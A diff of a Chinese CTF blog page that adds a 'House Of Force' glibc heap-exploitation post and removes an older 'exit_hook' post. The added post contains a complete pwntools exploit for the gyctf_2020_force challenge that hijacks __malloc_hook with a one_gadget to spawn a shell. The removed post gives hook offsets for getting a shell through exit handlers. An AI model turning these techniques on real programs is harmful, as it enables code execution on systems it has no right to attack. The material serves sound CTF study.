@@ -155,6 +155,123 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/20/House-Of-Force/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome!">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/05/20/House-Of-Force/" class="post-title-link" itemprop="url">House Of Force</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-05-20 19:46:41" itemprop="dateCreated datePublished" datetime="2025-05-20T19:46:41+08:00">2025-05-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-21 18:57:54" itemprop="dateModified" datetime="2025-05-21T18:57:54+08:00">2025-05-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h1><p>2.23~2.29</p>
+<p>2.29的libc中增加了top chunk的size域合法性检验</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 申请的大小如果超过系统内存，报错</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(size &gt; av-&gt;system_mem))</span><br><span class="line">	malloc_printerr(<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>作用:得到任意地址的chunk</p>
+<p>要求:</p>
+<ol>
+<li>控制top chunk的size域</li>
+<li>自由控制分配堆的大小</li>
+</ol>
+<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>​	通过溢出等方式修改top chunk的size域为一个很大的值(通常为-1,-1的补码为0xffffffff),然后申请一个堆块到指定地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将size域改为-1是为了通过这里的if检测,然后申请一个堆块,<code>top chunk</code>的地址就会对应的减去申请的堆块大小,如果申请的是负的大小的堆块,<code>top chunk</code>也会相应的增加对应值</p>
+<h1 id="例题-gyctf-2020-force"><a href="#例题-gyctf-2020-force" class="headerlink" title="例题 gyctf_2020_force"></a>例题 gyctf_2020_force</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="/../images/House-Of-Force/0.png" alt="0"></p>
+<p><code>main</code>函数没啥看的</p>
+<p><img src="/../images/House-Of-Force/1.png" alt="1"></p>
+<p>这里存在堆溢出漏洞,每次<code>malloc</code>结束还贴心的把堆地址告诉你</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>在<code>arena</code>未初始化之前或者初始化后申请一块大于<code>top chunk</code>大小的堆块会直接调用<code>sysmalloc</code>来申请内存,这块内存的地址与libc基址有着固定偏移,可以借此来泄露libc基址</p>
+<h3 id="改malloc-hook为ogg"><a href="#改malloc-hook为ogg" class="headerlink" title="改malloc_hook为ogg"></a><del>改malloc_hook为ogg</del></h3><p>这里直接改<code>malloc_hook</code>为<code>one_gadget</code>经测试行不通,因为无法满足其条件,只能另寻他法或者想办法构造<code>one_gadget</code>的条件</p>
+<p>我们这里选择通过realooc来满足<code>one_gadget</code>的条件</p>
+<h3 id="通过realloc来使one-gadget条件成立"><a href="#通过realloc来使one-gadget条件成立" class="headerlink" title="通过realloc来使one_gadget条件成立"></a>通过realloc来使<code>one_gadget</code>条件成立</h3><p><img src="/../images/House-Of-Force/2.png" alt="2"></p>
+<p>我们选择的是这条<code>one_gadget</code>,它的约束是<code>rsp+0x30</code>处要为NULL,而我们realloc中刚好有一条</p>
+<p><img src="/../images/House-Of-Force/3.png" alt="3"></p>
+<p>可以调整rsp的位置</p>
+<p><img src="/../images/House-Of-Force/5.png" alt="5"></p>
+<p>直接用修改<code>malloc_hook</code>为ogg</p>
+<p><img src="/../images/House-Of-Force/4.png" alt="4"></p>
+<p>通过<code>realloc</code>改变rsp后</p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/d/CTFs/gyctf2020/force/libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process([elf.path])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG <span class="keyword">and</span> local:</span><br><span class="line">	gdb.attach(io, </span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;	</span></span><br><span class="line"><span class="string">	b *$rebase(0xbcc)</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p    = <span class="keyword">lambda</span>      : pause()</span><br><span class="line">ru   = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">r    = <span class="keyword">lambda</span> x    : io.recv(x)</span><br><span class="line">s   = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl   = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia   = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla  = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa   = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x    : u32(r(x).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x    : u64(r(x).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg  = <span class="keyword">lambda</span> x,y  : log.success(<span class="built_in">str</span>(x) + <span class="string">&#x27; -&gt; &#x27;</span> + <span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">     sla(<span class="string">&quot;puts\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">     sla(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">     ru(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">     addr = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">     sla(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">     <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">     sla(<span class="string">&quot;puts\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc.address = add(<span class="number">0x21000</span>,<span class="string">&#x27;s&#x27;</span>) - <span class="number">0x5ca010</span></span><br><span class="line">    payload0 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;w&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    heap_addr = add(<span class="number">0x10</span>,payload0)</span><br><span class="line">    lg(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line">    lg(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">    <span class="comment">#p()</span></span><br><span class="line">    lg(<span class="string">&#x27;malloc_hook&#x27;</span>,libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>])</span><br><span class="line">    dest = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - (heap_addr + <span class="number">0x10</span>) - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">    add(dest,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    p()</span><br><span class="line">    ogg = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;x&#x27;</span> * <span class="number">0x8</span> + p64(libc.address + ogg[<span class="number">1</span>]) + p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    p()</span><br><span class="line">    sla(<span class="string">&#x27;puts\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">    </span><br><span class="line">    ia()</span><br></pre></td></tr></table></figure>
+
+<p>本地通了,buuctf的远程没打通,原因不明</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>house of force通过改变<code>top chunk</code>的size域使在申请一块非常大的堆块时不会适用<code>sysmalloc</code>来向系统申请映射内存,进而改变<code>top chunk</code>的位置</li>
+<li>在申请的内存大于<code>top chunk</code>时,系统会调用<code>sysmalloc</code>来像系统申请映射内存,申请的内存地址与libc基址有着,固定偏移可以通过该内存地址来leak libc</li>
+<li>在更改<code>__malloc_hook</code>为<code>one_gadget</code>时,如果因约束条件与栈上数据有关而失败可以尝试构造<code>__malloc_hook-&gt;realloc + 0x10-&gt;one_gadget</code>的方式来尝试满足<code>one_gadget</code>的约束条件,因为<code>realloc</code>函数里有一条<code>sub rsp,0x38</code>的指令</li>
+<li>用我的脚本在55行这里调试用<code>heap</code>指令看的时候显示的只有最开始<code>sysmalloc</code>分配的堆块,但是实际上<code>top chunk</code>是已经到了目标位置的,自己调试的时候可以注意下这里</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/15/%E4%BB%A3%E7%A0%81%E6%81%A2%E5%A4%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -505,7 +622,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-04 16:22:15" itemprop="dateModified" datetime="2025-05-04T16:22:15+08:00">2025-05-04</time>
+                <time title="修改时间：2025-05-20 19:46:23" itemprop="dateModified" datetime="2025-05-20T19:46:23+08:00">2025-05-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -532,7 +649,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>先来看<code>free</code>函数中这一段有关后向合并的代码:</p>
+          <h1 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h1><p>2.23~至今</p>
+<p>作用:得到<code>overlapping chunk</code></p>
+<p>需要修改chunk的P位</p>
+<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>先来看<code>free</code>函数中这一段有关后向合并的代码:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里新的chunk大小和新的chunk指针都由<code>prev_size</code>决定,所以我们可以通过控制<code>prev_size</code>来得到任意地址的chunk</p>
@@ -1040,118 +1160,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/27/exit_hook/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.png">
-      <meta itemprop="name" content="Sn0r1ax">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome!">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/27/exit_hook/" class="post-title-link" itemprop="url">exit_hook</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-03-27 13:53:12" itemprop="dateCreated datePublished" datetime="2025-03-27T13:53:12+08:00">2025-03-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-06 20:42:36" itemprop="dateModified" datetime="2025-04-06T20:42:36+08:00">2025-04-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="何为exit-hook"><a href="#何为exit-hook" class="headerlink" title="何为exit_hook"></a>何为exit_hook</h1><p>hook即修改地址,exit_hook即修改exit函数内的地址达到控制执行流的目的</p>
-<h2 id="hook-rtld-lock-un-lock-recursive"><a href="#hook-rtld-lock-un-lock-recursive" class="headerlink" title="hook rtld_lock_(un)lock_recursive"></a>hook rtld_lock_(un)lock_recursive</h2><p>由fini_array这篇文章知道了<code>exit)()</code>在执行时会先调用<code>__run_exit_handlers</code>,而在这个函数中又会调用<code>_dl_fini</code></p>
-<p><code>_dl_fini</code>函数源码如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#ifdef SHARED</span><br><span class="line">  int do_audit = 0;</span><br><span class="line"> again:</span><br><span class="line">#endif</span><br><span class="line">  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      if (nloaded == 0</span><br><span class="line">#ifdef SHARED</span><br><span class="line">      || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">#endif</span><br><span class="line">      )</span><br><span class="line">    __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>
-
-<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>
-
-<p><code>__rtld_lock_lock_recursive()</code>的定义:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># define __rtld_lock_lock_recursive(NAME) \</span><br><span class="line">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span><br></pre></td></tr></table></figure>
-
-<p>宏<code>GL</code>的定义：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># if IS_IN (rtld)</span><br><span class="line">#  define GL(name) _rtld_local._##name</span><br><span class="line"># else</span><br><span class="line">#  define GL(name) _rtld_global._##name</span><br><span class="line"># endif</span><br></pre></td></tr></table></figure>
-
-<p>而<code>_rtld_global</code>是一个结构体,我们可以在pwndbg中用<code>p _rtld_global</code>来查看</p>
-<p>结构体太长,这里我们这看结构体中作为上面俩函数的参数的部分</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_dl_load_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0,</span><br><span class="line">        __count = 0,</span><br><span class="line">        __owner = 0,</span><br><span class="line">        __nusers = 0,</span><br><span class="line">        __kind = 1,</span><br><span class="line">        __spins = 0,</span><br><span class="line">        __elision = 0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
-
-<p><strong>函数的参数即为 <code>_rtld_global._dl_load_lock.mutex.__size</code>的地址</strong></p>
-<h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>既然我们已经知道了关键函数及其参数的位置,那么我们<strong>直接将关键函数改为one_gadget来get shell</strong>,也可以<strong>将关键函数改为<code>system</code>,再把参数地址改为<code>/bin/sh\x00</code>地址</strong>来get shell</p>
-<h1 id="如何寻找偏移"><a href="#如何寻找偏移" class="headerlink" title="如何寻找偏移"></a>如何寻找偏移</h1><p><code>_rtld_global</code>结构位于<code>ld.so</code>中 ( <code>ld.sym[&#39;_rtld_global&#39;]</code> )，而<code>libc_base</code>与<code>ld_base</code>又有固定的差值,所以我们可以通过libc的基址来推出函数及其参数的地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc2.23下偏移为0×5f0040，两个hook的偏移为3848和3850</span><br><span class="line"></span><br><span class="line">libc2.27下偏移为0×61b060，两个hook的偏移为3840和3848</span><br></pre></td></tr></table></figure>
-
-<p>由于这个函数对于libc_base的偏移是固定的,故可以使用<code>p &amp;_rtld_global._dl_rtld_lock_recursive</code>来查看函数地址,再减去libc_base得到偏移</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive</span><br><span class="line">$4 = (void (**)(void *)) 0x7f1c260a8f60 &lt;_rtld_global+3840&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="hook-libc-atexit"><a href="#hook-libc-atexit" class="headerlink" title="hook __libc_atexit"></a>hook __libc_atexit</h1><p>exit.c源码如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__run_exit_handlers (int status, struct exit_function_list **listp,</span><br><span class="line">             bool run_list_atexit, bool run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">if (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>而在我们调用<code>__run_exit_handlers</code>这个函数时，参数<code>run_list_atexit</code>传进去的值就为真：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void exit (int status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, true, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因此，可以直接改<code>__libc_atexit</code>的值为<code>one_gadget</code>，在执行<code>exit</code>函数（从<code>main</code>函数退出时也调用了<code>exit()</code>）时，就能直接<code>getshell</code>了。<br>这个<code>__libc_atexit</code>有一个极大的优点，就是它在<code>libc</code>而非<code>ld</code>中，随远程环境的改变，不会有变化。缺点就是，它是无参调用的<code>hook</code>，传不了<code>/bin/sh</code>的参数，<code>one_gadget</code>不一定都能打通。</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm">pwn总结</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15759130.html">exit hook </a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/576942474">宸极实验室——『CTF』从两道题目学习 exit_hook</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1223,7 +1231,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1236,7 +1244,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
